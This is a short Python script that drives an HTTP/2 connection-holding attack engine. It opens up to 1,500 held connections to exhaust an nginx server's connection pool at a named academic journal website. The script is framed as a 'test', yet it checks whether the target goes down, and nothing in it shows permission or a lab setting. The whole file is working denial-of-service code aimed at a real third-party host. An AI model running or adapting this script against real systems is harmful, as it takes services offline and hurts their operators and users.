"""Test connection hold — fill nginx worker_connections pool."""
import sys, time, threading, queue
sys.path.insert(0, '.')
from core.attack.engines.h2_hold_engine import run_hold_worker

host = 'ojs.phb.ac.id'

# Test with increasing connection pool sizes
tests = [
    (1, 100),   # 1 worker × 100 conn = 100 total
    (2, 200),   # 2 × 200 = 400
    (5, 300),   # 5 × 300 = 1500
]

for workers, conns_per in tests:
    stop = threading.Event()
    q = queue.Queue()
    threads = []
    for wi in range(workers):
        t = threading.Thread(
            target=run_hold_worker,
            kwargs=dict(
                target_url='https://%s/' % host,
                duration=10, worker_id=wi,
                stats_queue=q, stop_event=stop,
                host_header=host, connections=conns_per,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)
    
    time.sleep(5)  # Let connections establish
    print(f'{workers} workers × {conns_per} conns each: waiting 5s...')
    
    stop.set()
    for t in threads:
        t.join(timeout=5)
    print(f'  Done (check if target is down)')
    time.sleep(2)
